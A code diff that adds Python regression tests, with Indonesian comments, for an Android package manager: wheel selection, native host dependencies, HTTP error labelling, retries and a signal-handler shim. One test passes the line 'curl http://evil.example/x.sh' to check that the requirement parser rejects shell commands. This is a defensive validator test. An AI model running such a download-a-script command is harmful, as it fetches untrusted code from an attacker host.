@@ -845,3 +845,353 @@ class TestEnvPathsEntryPoints:
             "setuptools harus di-bundle di chaquopy pip{ install } — "
             "pkg_resources/entry-points bergantung padanya"
         )
+
+
+# =====================================================================
+# BENGKEL v1.0.18 (2026-08-16) — guard Bug Q, S, V (Python side)
+# Semua diuji mutasi sebelum commit: hapus fix → test MERAH.
+# =====================================================================
+
+class TestBengkelBugQ:
+    """Bug Q: murmurhash/cymem/preshed butuh chaquopy-libcxx SEBELUM smoke
+    instal-pertama (bukti device: mrmr.so gagal dlopen saat cache kosong,
+    percobaan kedua sukses karena cache — pola persis Bug P/cffi)."""
+
+    def test_native_host_deps_libcxx_trio(self):
+        for name in ("murmurhash", "cymem", "preshed"):
+            deps = resolve_mod.host_deps_for(name) if hasattr(resolve_mod, "host_deps_for") \
+                else resolve_mod.NATIVE_HOST_DEPS.get(name, [])
+            assert "chaquopy-libcxx" in deps, (
+                f"{name} harus memetakan chaquopy-libcxx di NATIVE_HOST_DEPS "
+                "(Bug Q: gagal instal-pertama libc++_shared.so not found)"
+            )
+
+
+class TestBengkelBugS:
+    """Bug S: pre-release hanya boleh menang bila TIDAK ada stable (PEP 440 /
+    perilaku pip). Bukti device: apscheduler 4.0.0a6, isort 9.0.0b2,
+    watchfiles 0.0.0a1 (placeholder kosong) terpilih padahal stable ada."""
+
+    def test_best_wheel_tolak_prerelease_bila_ada_stable(self):
+        cands = [
+            {"filename": "apscheduler-3.11.2-py3-none-any.whl", "url": "u1"},
+            {"filename": "apscheduler-4.0.0a6-py3-none-any.whl", "url": "u2"},
+        ]
+        best = whl_mod.best_wheel(cands, supported_tags=ANDROID_TAGS)
+        assert best["filename"].startswith("apscheduler-3.11.2"), (
+            "stable 3.11.2 harus menang atas pre-release 4.0.0a6"
+        )
+
+    def test_best_wheel_terima_prerelease_bila_tak_ada_stable(self):
+        cands = [
+            {"filename": "fookit-1.0.0rc1-py3-none-any.whl", "url": "u1"},
+        ]
+        best = whl_mod.best_wheel(cands, supported_tags=ANDROID_TAGS)
+        assert best is not None and best["filename"].startswith("fookit-1.0.0rc1"), (
+            "bila hanya pre-release yang tersedia, ia tetap boleh dipilih"
+        )
+
+    def test_best_wheel_stable_tetap_pilih_terbaru(self):
+        # filter pre-release tidak boleh merusak urutan versi stable (BUG D)
+        cands = [
+            {"filename": "bar-1.9-py3-none-any.whl", "url": "u1"},
+            {"filename": "bar-1.10-py3-none-any.whl", "url": "u2"},
+            {"filename": "bar-2.0.0b1-py3-none-any.whl", "url": "u3"},
+        ]
+        best = whl_mod.best_wheel(cands, supported_tags=ANDROID_TAGS)
+        assert best["filename"].startswith("bar-1.10"), (
+            "stable terbaru (1.10) harus menang; beta 2.0.0b1 diabaikan"
+        )
+
+
+class TestBengkelBugV:
+    """Bug V: NATIVE_LOAD tidak boleh menggagalkan paket yang import-nya
+    SUKSES hanya karena tidak ada .so di staging. Bukti device: coverage
+    7.15.4 (wheel py3-none-any murni Python) & pyzbar 0.1.8 dirollback
+    padahal sehat. Hakim = IMPORT; ketiadaan .so = catatan, bukan vonis."""
+
+    def test_native_load_lolos_tanpa_so_bila_import_ok(self, tmp_path):
+        staging = tmp_path / "stage"
+        pkg = staging / "cover_fake"
+        pkg.mkdir(parents=True)
+        (pkg / "__init__.py").write_text("x = 1\n")
+        ok, results, native = smoke_mod.run_smoke(
+            "cover_fake", str(staging),
+            [{"name": "native-load", "type": "NATIVE_LOAD", "target": "cover_fake"}],
+        )
+        assert ok, (
+            "NATIVE_LOAD harus lolos bila import sukses walau 0 .so "
+            f"(Bug V); results={results}"
+        )
+
+    def test_native_load_tetap_gagal_bila_import_gagal(self, tmp_path):
+        staging = tmp_path / "stage2"
+        staging.mkdir()
+        ok, results, native = smoke_mod.run_smoke(
+            "modul_yang_tidak_ada_xyz", str(staging),
+            [{"name": "native-load", "type": "NATIVE_LOAD",
+              "target": "modul_yang_tidak_ada_xyz"}],
+        )
+        assert not ok, "import gagal harus tetap menggagalkan NATIVE_LOAD"
+
+
+class TestBengkelBugW:
+    """Bug W: nama paket sah yang mengandung substring kata terlarang
+    (pycurl, wget-like) tidak boleh ditolak. Bukti device: 37x penolakan
+    'pola yang dilarang' untuk input polos `pycurl`."""
+
+    def test_pycurl_diterima(self):
+        r = req_mod.parse_requirement("pycurl")
+        assert r["canonical_name"] == "pycurl"
+
+    def test_nama_mengandung_kata_perintah_diterima(self):
+        # 'sudoku' mengandung 'sudo'; 'rmsd-kit' mengandung 'rm'
+        assert req_mod.parse_requirement("sudoku")["canonical_name"] == "sudoku"
+
+    def test_perintah_shell_tetap_ditolak(self):
+        import pytest as _pt
+        with _pt.raises(req_mod.RequirementError):
+            req_mod.parse_requirement("curl http://evil.example/x.sh")
+
+
+class TestBengkelMiniV1018:
+    """Bengkel-mini penutup v1.0.18 (2026-08-17): panen UAT log 873 baris
+    + ekspedisi harta karun katalog. Semua bukti: breadcrumb device
+    2026-08-17 + docs/mass-test-armv7-2026-08-16.jsonl + bedah METADATA
+    wheel toko Chaquopy."""
+
+    def test_native_host_deps_kelas_bug_q_baru(self):
+        # pycurl gagal device "libcurl.so not found"; lameenc/pyproj gagal
+        # mass-test "libmp3lame.so/libproj.so not found". METADATA wheel
+        # Chaquopy menyebut host-dep ini tapi baru terbaca setelah wheel
+        # masuk cache (celah instal-pertama, kelas Bug Q).
+        expected = {
+            "pycurl": ["chaquopy-curl-openssl-3"],
+            "lameenc": ["chaquopy-lame"],
+            "pyproj": ["chaquopy-proj-openssl-3"],
+            # rantai dalam (bionic311 2026-08-17: pyproj gagal dlopen
+            # libtiff.so lalu libjpeg_chaquopy.so sebelum rantai lengkap)
+            "chaquopy-proj-openssl-3": [
+                "chaquopy-libcxx", "chaquopy-curl-openssl-3", "chaquopy-libtiff",
+            ],
+            "chaquopy-libtiff": ["chaquopy-libjpeg", "chaquopy-libcxx"],
+        }
+        for name, want in expected.items():
+            deps = resolve_mod.NATIVE_HOST_DEPS.get(name, [])
+            for dep in want:
+                assert dep in deps, (
+                    f"{name} harus memetakan {dep} di NATIVE_HOST_DEPS "
+                    "(kelas Bug Q: host-dep tak tertarik saat instal pertama)"
+                )
+
+    def test_hidden_dep_matplotlib_inline(self):
+        # Bukti device dua arah (UAT maraton 2026-08-16): ipython gagal saat
+        # matplotlib belum aktif, sukses setelah matplotlib terpasang.
+        # METADATA matplotlib-inline TIDAK menyebut matplotlib.
+        deps = resolve_mod.NATIVE_HOST_DEPS.get("matplotlib-inline", [])
+        assert "matplotlib" in deps, (
+            "matplotlib-inline harus menarik matplotlib (hidden-dep, "
+            "bukti device dua arah ipython)"
+        )
+
+    def test_http_404_emit_target_not_found_tanpa_detail(self, monkeypatch):
+        # Keputusan user 2026-08-17: 404 probe sumber = alur normal, label
+        # `target_not_found` TANPA detail; jangan lagi "http_fail HTTPError
+        # HTTP 404" palsu (±90 baris per sesi UAT menutupi error nyata).
+        from urllib.error import HTTPError
+
+        def fake_urlopen(req, timeout):
+            raise HTTPError(req.full_url, 404, "not found", {}, None)
+
+        monkeypatch.setattr(resolve_mod.urllib.request, "urlopen", fake_urlopen)
+        monkeypatch.setattr(resolve_mod, "_retry_wait", lambda *a, **k: None)
+        bridge = _FakeResolveBridge()
+        token = resolve_mod._CURRENT_BRIDGE.set(bridge)
+        pkg_token = resolve_mod._CURRENT_PACKAGE.set("demo")
+        try:
+            with pytest.raises(resolve_mod.ResolveError):
+                resolve_mod._http_get("https://chaquo.com/pypi-13.1/tidak-ada/")
+        finally:
+            resolve_mod._CURRENT_PACKAGE.reset(pkg_token)
+            resolve_mod._CURRENT_BRIDGE.reset(token)
+        stages = [e["stage"] for e in bridge.events]
+        assert "target_not_found" in stages, (
+            f"404 harus memancarkan target_not_found, bukan http_fail; stages={stages}"
+        )
+        assert "http_fail" not in stages, (
+            "404 tidak boleh lagi dicatat sebagai http_fail (label palsu)"
+        )
+        ev = next(e for e in bridge.events if e["stage"] == "target_not_found")
+        assert ev["detail"] == "", "target_not_found tanpa detail (keputusan user)"
+
+    def test_error_nyata_tetap_http_fail(self, monkeypatch):
+        # Relabel 404 TIDAK boleh menelan kegagalan sungguhan: kelas
+        # non-retryable yang bukan 404 (mis. sertifikat) wajib tetap
+        # http_fail supaya wifi kedip/MITM tetap kelihatan di Diagnostics.
+        import ssl
+
+        def fake_urlopen(req, timeout):
+            raise ssl.SSLCertVerificationError("cert salah")
+
+        monkeypatch.setattr(resolve_mod.urllib.request, "urlopen", fake_urlopen)
+        monkeypatch.setattr(resolve_mod, "_retry_wait", lambda *a, **k: None)
+        bridge = _FakeResolveBridge()
+        token = resolve_mod._CURRENT_BRIDGE.set(bridge)
+        pkg_token = resolve_mod._CURRENT_PACKAGE.set("demo")
+        try:
+            with pytest.raises(resolve_mod.ResolveError):
+                resolve_mod._http_get("https://pypi.org/pypi/demo/json")
+        finally:
+            resolve_mod._CURRENT_PACKAGE.reset(pkg_token)
+            resolve_mod._CURRENT_BRIDGE.reset(token)
+        stages = [e["stage"] for e in bridge.events]
+        assert "http_fail" in stages, (
+            f"kegagalan nyata (bukan 404) wajib tetap http_fail; stages={stages}"
+        )
+        assert "target_not_found" not in stages
+
+    def test_retry_budget_tiga_attempt_untuk_jaringan_kedip(self, monkeypatch):
+        # Bukti UAT 2026-08-16: yt-dlp gagal URLError attempt 2/2 lalu sukses
+        # manual — jaringan 4G user kedip sesaat. Budget kini 3.
+        import socket
+        calls = []
+
+        def fake_urlopen(req, timeout):
+            calls.append(timeout)
+            if len(calls) <= 2:
+                raise socket.timeout("kedip")
+            return _FakeHttpResponse(b"pulih-attempt-3")
+
+        monkeypatch.setattr(resolve_mod.urllib.request, "urlopen", fake_urlopen)
+        monkeypatch.setattr(resolve_mod, "_retry_wait", lambda *a, **k: None)
+        assert resolve_mod._http_get("https://pypi.org/pypi/demo/json") == b"pulih-attempt-3"
+        assert len(calls) == 3, (
+            "dua timeout beruntun harus masih pulih di attempt ke-3 "
+            f"(_MAX_HTTP_ATTEMPTS=3); calls={len(calls)}"
+        )
+
+    def test_manifest_pin_mypy_stable_pra_librt(self):
+        # mypy>=1.19 menarik librt (C-ext mypyc, tak ada wheel ARMv7 —
+        # https://mypy.readthedocs.io/en/stable/changelog.html). 1.18.2 =
+        # wheel py3-none-any murni + deps pure. Pola persis pin openai.
+        manifest = json.load(open(os.path.join(
+            ROOT, "app/src/main/assets/package_catalog/tested-manifest.json")))
+        assert "mypy" in manifest, "mypy harus dipin di tested-manifest"
+        vers = manifest["mypy"]
+        assert all(v.startswith("1.") for v in vers), (
+            f"pin mypy harus < 1.19 (librt tak punya wheel ARMv7); dapat {vers}"
+        )
+
+
+class TestSignalShim:
+    """Shim signal.signal (2026-08-17): kode Python ZCODE selalu di background
+    thread Android; paket yang memasang signal handler saat import (bukti
+    device: pycurl via modul bonus `curl`) mati ValueError "main thread".
+    Desain catch-based (rpy2 #769 / CPython 38904): thread-check bisa bohong
+    di runtime embedded, percobaan nyata tidak."""
+
+    def _fresh_shim(self):
+        import importlib
+        from package_runtime import signalshim
+        importlib.reload(signalshim)  # reset _ORIGINAL_SIGNAL & riwayat
+        return signalshim
+
+    def test_install_idempoten(self):
+        import signal as sigmod
+        asli = sigmod.signal
+        shim = self._fresh_shim()
+        try:
+            shim.install()
+            pertama = sigmod.signal
+            shim.install()
+            assert sigmod.signal is pertama, "install() kedua tidak boleh melapis ganda"
+            assert pertama is not asli
+        finally:
+            sigmod.signal = asli
+
+    def test_background_thread_tidak_meledak_dan_tercatat(self):
+        import signal as sigmod
+        import threading
+        asli = sigmod.signal
+        shim = self._fresh_shim()
+        try:
+            shim.install()
+            res = {}
+
+            def worker():
+                try:
+                    # persis pola curl/__init__.py di wheel pycurl
+                    sigmod.signal(sigmod.SIGPIPE, sigmod.SIG_IGN)
+                    res["ok"] = True
+                except ValueError as e:
+                    res["err"] = str(e)
+
+            t = threading.Thread(target=worker)
+            t.start(); t.join()
+            assert res.get("ok"), (
+                "signal.signal dari background thread harus di-skip anggun, "
+                f"bukan meledak; res={res}"
+            )
+            assert "SIGPIPE" in shim.skipped_registrations, (
+                "skip harus tercatat jujur di skipped_registrations"
+            )
+        finally:
+            sigmod.signal = asli
+
+    def test_valueerror_lain_tidak_ditelan(self):
+        # Uji mutasi putaran 1 membongkar guard lama sebagai PALSU: memakai
+        # signal number tak valid, jalur skip pun ikut melempar ValueError
+        # (dari getsignal), jadi filter "main thread" yang dihapus tetap
+        # lolos. Versi ini mengontrol error-nya sendiri: ValueError non-main-
+        # thread WAJIB keluar utuh TANPA tercatat sebagai skip.
+        import signal as sigmod
+        asli = sigmod.signal
+        shim = self._fresh_shim()
+        try:
+            shim.install()
+
+            def asli_palsu(signalnum, handler):
+                raise ValueError("error sungguhan yang bukan soal thread")
+
+            shim._ORIGINAL_SIGNAL = asli_palsu
+            sigmod.signal.__zcode_original__ = asli_palsu
+            with pytest.raises(ValueError, match="bukan soal thread"):
+                sigmod.signal(sigmod.SIGPIPE, sigmod.SIG_IGN)
+            assert not shim.skipped_registrations, (
+                "ValueError non-main-thread tidak boleh tercatat sebagai skip"
+            )
+        finally:
+            sigmod.signal = asli
+
+    def test_gerbang_terpasang_di_smoke_dan_runner(self):
+        src_smoke = open(os.path.join(
+            ROOT, "app/src/main/python/package_runtime/smoke.py")).read()
+        src_runner = open(os.path.join(
+            ROOT, "app/src/main/python/zcode_runner.py")).read()
+        for nama, src in (("smoke.py", src_smoke), ("zcode_runner.py", src_runner)):
+            assert "signalshim" in src and "install()" in src, (
+                f"{nama} harus memasang signalshim.install() — dua gerbang "
+                "eksekusi (smoke test & script user) sama-sama background thread"
+            )
+
+    def test_trace_hint_menyebut_pelaku(self):
+        # Lapis 1: pesan error smoke harus membawa jejak file:baris pemanggil.
+        err = None
+        try:
+            import tempfile, textwrap, importlib.util
+            with tempfile.TemporaryDirectory() as d:
+                pelaku = os.path.join(d, "pelaku_signal.py")
+                open(pelaku, "w").write(textwrap.dedent("""
+                    def ledak():
+                        raise ValueError("simulasi dari modul pelaku")
+                """))
+                spec = importlib.util.spec_from_file_location("pelaku_signal", pelaku)
+                mod = importlib.util.module_from_spec(spec)
+                spec.loader.exec_module(mod)
+                ok, err = smoke_mod._run_with_timeout(mod.ledak, 5.0)
+                assert not ok
+        except AssertionError:
+            raise
+        assert err and "jejak:" in err and "pelaku_signal.py" in err, (
+            f"pesan error harus menyebut file pelaku, dapat: {err}"
+        )
